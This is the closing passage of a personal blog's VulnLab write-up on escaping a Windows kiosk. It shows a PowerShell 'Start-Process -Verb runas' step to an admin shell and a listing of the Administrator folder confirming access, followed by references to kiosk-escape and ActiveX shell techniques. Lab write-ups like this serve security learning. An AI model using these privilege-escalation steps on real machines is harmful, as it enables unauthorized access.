+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users\&gt; <span class="built_in">Start-Process</span> powershell <span class="literal">-Verb</span> runas</span><br></pre></td></tr></table></figure>
+<ul>
+<li>Using this command, I triggered a UAC prompt to open powershell as the administrator. No password was required. In the new powershell terminal, I found that I now have all the privileges a local admin would rightfully have.</li>
+</ul>
+<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">PS</span> C:\Users&gt; <span class="built_in">cd</span> Administrator</span><br><span class="line">Access is denied</span><br><span class="line"><span class="built_in">PS</span> C:\Users&gt; <span class="built_in">dir</span> .\Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    Directory: C:\Users\Administrator</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Mode                 LastWriteTime         Length Name</span><br><span class="line"><span class="literal">----</span>                 <span class="literal">-------------</span>         <span class="literal">------</span> <span class="literal">----</span></span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                <span class="number">3</span>D Objects</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Contacts</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Desktop</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Documents</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Downloads</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Favorites</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Links</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Music</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                OneDrive</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Pictures</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Saved Games</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Searches</span><br><span class="line">d<span class="literal">-----</span>        <span class="number">2026</span><span class="literal">-01-22</span>     <span class="number">08</span>:<span class="number">25</span>                Videos</span><br></pre></td></tr></table></figure>
+<ul>
+<li>I confirmed this by successfully accessing the <code>C:\Users\Administrator</code> directory.</li>
+</ul>
+<h1 id="References"><a href="#References" class="headerlink" title="References"></a>References</h1><ol>
+<li><a target="_blank" rel="noopener" href="https://book.hacktricks.wiki/en/hardware-physical-access/escaping-from-gui-applications.html">HackTricks - Escaping Windows Kiosks</a></li>
+<li><a target="_blank" rel="noopener" href="https://blog.nviso.eu/2022/05/24/breaking-out-of-windows-kiosks-using-only-microsoft-edge/">Breaking out of Windows Kiosks using only MS Edge</a></li>
+<li><a target="_blank" rel="noopener" href="https://stackoverflow.com/questions/44825859/get-output-on-shell-execute-in-js-with-activexobject">Get a shell using JavaScript with ActiveXObject</a></li>
+<li><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/answers/questions/2370784/enable-activex-control-in-microsoft-edge-latest?forum=microsoftedge-all&referrer=answers">Enabling IE Mode in MS Edge</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.portablefreeware.com/index.php?id=2025">BulletsPassView</a></li>
+</ol>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">Jon Loh</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2026/01/27/Escape/">http://example.com/2026/01/27/Escape/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/Insecure-AppLocker-Configurations/">Insecure AppLocker Configurations</a><a class="post-meta__tags" href="/tags/Insecure-Windows-Kiosk-Configurations/">Insecure Windows Kiosk Configurations</a></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2026/01/27/Manage/" title="Manage"><img class="cover" src="/images%5CManage%5Cmanage_vl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">Manage</div></div><div class="info-2"><div class="info-item-1">TLDRLearn to enumerate the Java Remote Method Invocation (RMI) Framework and gain RCE on the target server. Enumeration12345678910111213(jon@kali)-[~/vulnLab/easy/manage]$ sudo nmap -p- manage.vl...Nmap scan report for manage.vl (10.10.95.212)Host is up (0.16s latency).Not shown: 65530 closed tcp ports (reset)PORT      STATE SERVICE22/tcp    open  ssh2222/tcp  open  EtherNetIP-18080/tcp  open  http-proxy35221/tcp open  unknown43123/tcp open  unknownNmap done: 1 IP address (1 host up) scanned ...</div></div></div></a><a class="pagination-related" href="/2026/01/22/Lock/" title="Lock"><img class="cover" src="/images%5CLock%5Clock_vl.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Lock</div></div><div class="info-2"><div class="info-item-1">TLDRYou will learn about the Git API, CI&#x2F;CD Deployments &amp; a PrivEsc technique on a MSI installer. Enumeration1234567891011121314(jon@kali)-[~/vulnLab/easy/lock/website]$ sudo nmap -p- --min-rate=1000 -T4 lock.vlStarting Nmap 7.95 ( https://nmap.org ) at 2026-01-22 10:43 +08Nmap scan report for lock.vl (10.10.102.59)Host is up (0.20s latency).Not shown: 65529 filtered tcp ports (no-response)PORT     STATE SERVICE80/tcp   open  http445/tcp  open  microsoft-ds3000/tcp open  ppp3389/tcp ...</div></div></div></a></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/images/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">Jon Loh</div><div class="author-info-description">Info Sec Undergraduate</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">23</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/jon1oh" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="https://www.linkedin.com/in/jon-loh/" target="_blank" title="LinkedIn"><i class="fab fa-linkedin" style="color: #0a66c2;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">Welcome to my blog site! This is where I share my VulnLab writeups and all things cyber!</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#TLDR"><span class="toc-number">1.</span> <span class="toc-text">TLDR</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Enumeration"><span class="toc-number">2.</span> <span class="toc-text">Enumeration</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RDP-3389"><span class="toc-number">2.1.</span> <span class="toc-text">RDP (3389)</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Gaining-a-Foothold-Escaping-Windows-Kiosk"><span class="toc-number">3.</span> <span class="toc-text">Gaining a Foothold (Escaping Windows Kiosk)</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Escaping-Browser-Restrictions"><span class="toc-number">3.1.</span> <span class="toc-text">Escaping Browser Restrictions</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#Via-the-URL-bar"><span class="toc-number">3.1.1.</span> <span class="toc-text">Via the URL bar</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Via-File-Explorer"><span class="toc-number">3.1.2.</span> <span class="toc-text">Via File Explorer</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#RCE-on-escape-vl"><span class="toc-number">4.</span> <span class="toc-text">RCE on escape.vl</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Via-Name-based-AppLocker-Bypass"><span class="toc-number">4.1.</span> <span class="toc-text">Via Name-based AppLocker Bypass</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Via-ActiveXObject"><span class="toc-number">4.2.</span> <span class="toc-text">Via ActiveXObject</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Post-Exploitation"><span class="toc-number">5.</span> <span class="toc-text">Post-Exploitation</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#PrivEsc-to-admin"><span class="toc-number">5.1.</span> <span class="toc-text">PrivEsc to admin</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Bypass-UAC"><span class="toc-number">5.2.</span> <span class="toc-text">Bypass UAC</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#References"><span class="toc-number">6.</span> <span class="toc-text">References</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2026/05/25/hello-world/" title="Hello World">Hello World</a><time datetime="2026-05-25T15:47:49.410Z" title="Created 2026-05-25 23:47:49">2026-05-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/02/24/Bruno/" title="Bruno"><img src="/images%5CBruno%5Cbruno_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Bruno"/></a><div class="content"><a class="title" href="/2026/02/24/Bruno/" title="Bruno">Bruno</a><time datetime="2026-02-24T12:45:15.000Z" title="Created 2026-02-24 20:45:15">2026-02-24</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/27/Manage/" title="Manage"><img src="/images%5CManage%5Cmanage_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Manage"/></a><div class="content"><a class="title" href="/2026/01/27/Manage/" title="Manage">Manage</a><time datetime="2026-01-27T07:56:29.000Z" title="Created 2026-01-27 15:56:29">2026-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/27/Escape/" title="Escape"><img src="/%5Cimages%5CEscape%5Cescape_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Escape"/></a><div class="content"><a class="title" href="/2026/01/27/Escape/" title="Escape">Escape</a><time datetime="2026-01-27T03:35:12.000Z" title="Created 2026-01-27 11:35:12">2026-01-27</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2026/01/22/Lock/" title="Lock"><img src="/images%5CLock%5Clock_vl.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Lock"/></a><div class="content"><a class="title" href="/2026/01/22/Lock/" title="Lock">Lock</a><time datetime="2026-01-22T02:40:23.000Z" title="Created 2026-01-22 10:40:23">2026-01-22</time></div></div></div></div></div></div></main><footer id="footer"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 - 2026 By Jon Loh</span><span class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo 8.1.1</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly 5.5.3</a></span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=5.5.3"></script><script src="/js/main.js?v=5.5.3"></script><div class="js-pjax"></div><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.6/dist/activate-power-mode.min.js"></script><script>POWERMODE.colorful = false;
+POWERMODE.shake = true;
+POWERMODE.mobile = false;
+document.body.addEventListener('input', POWERMODE);
+</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
